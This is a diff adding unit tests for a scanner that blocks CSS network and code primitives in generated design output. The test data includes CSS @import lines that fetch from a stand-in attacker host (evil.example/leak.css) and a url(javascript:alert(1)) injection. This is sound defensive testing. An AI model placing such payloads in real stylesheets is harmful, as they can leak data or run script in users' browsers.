@@ -222,3 +222,73 @@ class TestScanDesignOutput:
         report = scan_design_output(output)
         assert not report.passed
         assert any(f.startswith("page.app.js:") for f in report.blocking_flags)
+
+
+class TestCssNetworkPrimitiveReview:
+    """The CSS network/code primitive keeps its reviewed-URL exceptions.
+
+    These cases pin the `@import` arm of `_css_network_or_code_is_blocking`
+    and the URL-authority review that decides whether a matched primitive
+    may fetch: same-host path drift, non-HTTP schemes, and unparseable
+    authorities all stay blocking, exactly like the `url(...)` arm the
+    hostile corpus already covers.
+    """
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "<style>@import url(https://evil.example/leak.css);</style>",
+            '<style>@import "https://evil.example/leak.css";</style>',
+            "<style>.x { background: url(javascript:alert(1)) }</style>",
+            "<style>.x { background: url(https://example.com:99999999/leak) }</style>",
+        ],
+    )
+    def test_unreviewed_css_fetch_primitive_is_blocking(self, payload: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(payload))
+        assert not report.passed
+        assert any("CSS network/code primitive" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("behavioral")
+    @pytest.mark.scope("unit")
+    def test_allowlisted_import_passes_importer_view(self):
+        """The importer-side scan keeps the reviewed-URL exception for @import.
+
+        The output boundary (``scan_design_text``) blocks every fetch
+        primitive unconditionally through the visual-artifact vocabulary;
+        the importer view is where the reviewed allowlist is applied.
+        """
+        from maistro_design.scan import scan_blocking_patterns
+
+        blocking = scan_blocking_patterns(
+            "theme.css", "@import url(https://fonts.googleapis.com/css2?family=Inter);", None
+        )
+        assert blocking == []
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_same_authority_path_drift_is_not_the_reviewed_url(self):
+        """An allowlist entry naming a path licenses that path, not the host."""
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(
+            _file_output("<style>@import url(https://fonts.googleapis.com/leak.css);</style>"),
+            url_allowlist=("https://fonts.googleapis.com/css",),
+        )
+        assert not report.passed
+        assert any("CSS network/code primitive" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_pattern_engine_failure_fails_closed(self):
+        """A regex engine that dies mid-scan must block, not pass."""
+        from maistro_design.scan import _pattern_matches
+
+        class _ExplodingPattern:
+            def search(self, content: str, timeout: float | None = None) -> object:
+                raise TimeoutError("backtracking budget exceeded")
+
+        assert _pattern_matches(_ExplodingPattern(), "benign content") is True
